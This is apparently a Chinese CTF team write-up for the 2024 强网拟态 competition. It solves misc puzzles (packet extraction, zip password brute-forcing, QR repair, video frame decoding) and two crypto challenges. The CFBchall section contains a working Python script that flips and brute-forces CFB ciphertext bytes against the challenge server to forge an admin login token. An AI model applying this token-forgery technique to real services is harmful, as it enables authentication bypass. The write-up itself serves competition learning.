两个tcp流里的data提出来放一起，是个压缩包，解压

flag.zip是png,改后缀打开就行了

PVZ

根据提示，估算花了500-2000阳光

写脚本生成字典

JSON

import hashlib

# 创建一个新的TXT文件

with open(‘md5_hashes.txt’, ‘w’) as file:

# 遍历从500到2000的每个数字

for number in range(500, 2001):

# 将数字转换为字符串并计算MD5哈希值

md5_hash = hashlib.md5(str(number).encode()).hexdigest()

# 将哈希值写入文件，每个哈希值占一行

file.write(md5_hash + ‘n’)

print(“MD5哈希值已生成并写入 md5_hashes.txt 文件。”)

爆破密码

解压以后看到一个二维码，用扫描全能王拉伸，补齐三个角，微信可以识别了

看文件名搜到Malbolge

在线网站解密就行了

Streaming

h264流

解码一下

插件提取

打开视频看

flag1

看到一大串ff,先亦或ff

‘flag{3b3a9c08-‘

拿这个做密钥aes解密，可以的到一个压缩包

压缩包里有两个文件

flag2

看badapple

FotoForensics – Analysis

在线工具梭，苹果图片解析差异

flag3

补全文件头打开，看到一个只有黑白帧的视频，写脚本提取

JSON

from moviepy.editor import VideoFileClip

import numpy as np

def is_black_frame(frame, threshold=0):

“””

判断一个帧是否为黑色帧。

如果帧的所有像素值都小于等于阈值，则认为该帧为黑色帧。

“””

return np.all(frame[:, :, :3] <= threshold)

def process_video(video_path):

video = VideoFileClip(video_path)

frames = video.iter_frames()

binary_string = ”

for frame in frames:

if is_black_frame(frame):

binary_string += ‘1’

else:

binary_string += ‘0’

# 转换为ASCII字符

ascii_string = ”.join(chr(int(binary_string[i:i + 8], 2)) for i in range(0, len(binary_string), 8))

return ascii_string

# 使用示例

video_path = ‘2.mov’  # 替换为你的MOV视频文件路径

ascii_result = process_video(video_path)

print(ascii_result)

FIND WAY to read video

社工 找到gitcode  垃圾邮件加密，

复制时要把md文件clone下来再复制，否则直接以md复制会有格式错误，在解码时会出现乱码

解码之后

一段BV1wm2EY2Egx

一段base

JSON

eyJ2IjozLCJuIjoiZjE0ZyIsInMiOiIiLCJoIjoiZjczZDEyZCIsIm0iOjkwLCJrIjo4MSwibWci
OjIwMCwia2ciOjEzMCwibCI6NDMsInNsIjoxLCJmaGwiOlsiMjUyZjEwYyIsImFjYWM4NmMiLCJj
YTk3ODExIiwiY2QwYWE5OCIsIjAyMWZiNTkiLCIyYzYyNDIzIiwiNGUwNzQwOCIsIjRlMDc0MDgi
LCJjYTk3ODExIiwiMmU3ZDJjMCIsIjZiODZiMjciLCIzZjc5YmI3IiwiNGUwNzQwOCIsIjM5NzNl
MDIiLCJkNDczNWUzIiwiNGIyMjc3NyIsIjc5MDI2OTkiLCJlN2Y2YzAxIiwiMzk3M2UwMiIsIjRi
MjI3NzciLCI0YjIyNzc3IiwiNmI4NmIyNyIsIjJlN2QyYzAiLCIzOTczZTAyIiwiY2E5NzgxMSIs
IjNmNzliYjciLCI0ZTA3NDA4IiwiZDQ3MzVlMyIsIjM5NzNlMDIiLCIzZjc5YmI3IiwiM2Y3OWJi
NyIsIjI1MmYxMGMiLCIzZjc5YmI3IiwiNmI4NmIyNyIsIjE4YWMzZTciLCI1ZmVjZWI2IiwiNGUw
NzQwOCIsIjE4YWMzZTciLCIxOGFjM2U3IiwiMTk1ODFlMiIsIjNmNzliYjciLCJkMTBiMzZhIiwi
MDFiYTQ3MSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5
IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0
MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2
ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjki
LCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQw
YjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZl
MzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNzdhZGZjOSIs
ImRlN2QxYjciLCI0NGJkN2FlIiwiYmI3MjA4YiIsIjgzODkxZDciLCIyYTBhYjczIiwiZmUxZGNk
MyIsIjU1OWFlYWQiLCJmMDMxZWZhIl19

猜测base这段是视频的某种源，没想到有啥用

然后一个分p90段的视频

[clip.zip]

切片完之后的

从0005到0132好像是在递增，描述128位，然后从133开始到后面

头4张图片跟尾4张图片没看出来有啥用

然后就是看像素点，像素点是从24位到40位都出现过白点，也就是都是1，但是第24位好像一直都是1，也就没管，就是从25位到40位，正好16位

不过咋都分析不出来，回头想到唯独漏掉了第五张图片0004，细细看了一眼每个视频这一帧都不一样，提取其像素，转为01字符串，转ASCII得到flag.

想来是只看到了第一个视频的这张图，想当然以为这是从0开始，而把它忽略了。

JSON

分析像素点的代码，将就着看

import time

for k in range(90):

m=1

for i in range(4,5):

directory = f’D:\qqfile\cli\frames_output{k}\frame_{i:
04d}.png’  # 替换为你的目录路径

from PIL import Image

sum_x=[]

# 打开图像

image_path = ‘path_to_your_image.jpg’  # 替换为你的图像路径

image = Image.open(directory)

width, height = image.size

# print(f”Image dimensions: {width}x{height}”)

flag=[‘0’]*8

# 提取特定像素点的颜色值

# x, y = 5, 0  # 替换为你感兴趣的像素位置

# pixel_value = image.getpixel((x, y))

# print(image.getpixel((33, 2)))

for x in range(32,32+8):

# for y in range(224):

pixel_value = image.getpixel((x, 0))

# pixel_value2 = image2.getpixel((x, 0))

# pixel_value2 = image3.getpixel((x, 0))

if pixel_value >= (10,10,10):

# print(f”Pixel value at ({x}, {0}): {pixel_value}”)

flag[(x-25)]=’1′

# print(flag)

flag=”.join(flag)

print(chr(int(flag, 2)), end=”)

Crypto:

xor

mimic is a keyword.

0b050c0e180e585f5c52555c5544545c0a0f44535f0f5e445658595844050f5d0f0f55590c555e5a0914

简单异或一下

CFBchall

CFB模式在解密时，密文中一位数据的改变仅会影响两个明文块：对应平文块中的一位数据与下一块中全部的数据，而之后的数据将恢复正常。

在解密时，改变某一个字节数据的一些最低比特时，仍能解密，解密出来的数据与原数据相近（但并不同），可以利用该点来得到我们的username，如当我们注册时username以admim开头，改变加密后最后一个m所对应的数据的比特（如加减1， 2等），有几率得到admin

因改变了m的加密数据，后16个字节收到影响，我们有x00进行截断分割，可以填充17个字节垃圾数据，爆破这17个字节加密后的第一个字节，使得该字节解密后得到x00，16个字节垃圾数据受到影响，但被爆破得到的x00和原数据自带的x00分割后被丢弃。

同理，因password有长度限制（不可小于8），admin对应的密码为123456。我们将password设置为17个垃圾数据加123456，改变第一个字节数据，后16个字节受影响，爆破第一个加密后的字节，使得第17个字节为x00将垃圾数据截断。

题目限制了输入为可见字符，无法直接使用x00截断，而采取一定的爆破；题目给了500次登录尝试，我们分2批分别爆破username和password各256次，运气好点还是绰绰有余的。先爆破username，将密码设置为你的垃圾数据+123456，先确保username=admin返回密码错误的msg，在爆破password得到flag

Python

import  requests

url = “http://web-bd8cccca1c.challenge.xctf.org.cn:80/”

# url = “http://127.0.0.1:
5000”

def reflash():

requests.post(url, json={“action”: “restart”})

def encrypy_web():

data = {“action”: “register”, “username”: username, “password”: password}

token = requests.post(url, json=data).json()[“message”]

return token.split(‘: ‘)[1]

def decrypt_web(token, password):

data = {“action”: “login”, “username”: “admin”, “password”: password, “token”: token}

return requests.post(url, json=data).json()[“message”]

# iv = b”2″*16

# key = b”1″*16

username = “admim” + “x09” * 17

password = “x09” * 17 + “123456”

data = f”{username}x00{password}x01x02x03″

while True:

# initialize_globals()

reflash()

# token = encrypt(data, key)

token = encrypy_web()

flag = 0

token0 = token[:9] + hex((int(token[9], 16) – 1)%16)[2:].zfill(1)

# if token0[:10] != encrypt(“admin”, key): continue

# print(encrypt(“adminx00”, key))

# print(token)

for i in range(256):

ct = token0 + hex(i)[2:].zfill(2) + token[12:]

# print(ct)

# decrypted = decrypt(ct, key)

decrypted = decrypt_web(ct, password)

# print(i, decrypted)

# token_username, *_, token_password = decrypted.split(b’x00′)

# token_password = token_password[:-3]

# print(hex(i)[2:].zfill(2), token_username, _, token_password)

print(decrypted)

if decrypted == ‘Admin login failed, please try again’:

# if token_username == b”admin”

print(i)

flag = 1

# input()

break

if flag == 0: continue

ct0 = token0 + hex(i)[2:].zfill(2)

for i in range(256):

ct = ct0 + token[12:12 + 44] + hex(i)[2:].zfill(2) + token[-50:]

# decrypted = decrypt(ct, key)

decrypted = decrypt_web(ct, “123456”)

# print(decrypted.split(b’x00′))

# token_username, *_, token_password = decrypted.split(b’x00′)

# token_password = token_password[:-3]

# print(hex(i)[2:].zfill(2), token_username, _, token_password)

# if username == token_username and password == token_password:

# if token_password == b’123456′:

# print(token_password)

if “flag” in decrypted:

print(decrypted)

flag = 1

break

if flag == 1:

break

原文始发于微信公众号（Nepnep网络安全）：2024 强网拟态 Nepnep WP

---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/0-1729515646.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/0-1729515646.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/0-1729515647.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/8-1729515648.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/8-1729515649.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/2-1729515651.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/8-1729515652.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/0-1729515652.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/9-1729515652.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/5-1729515654.png)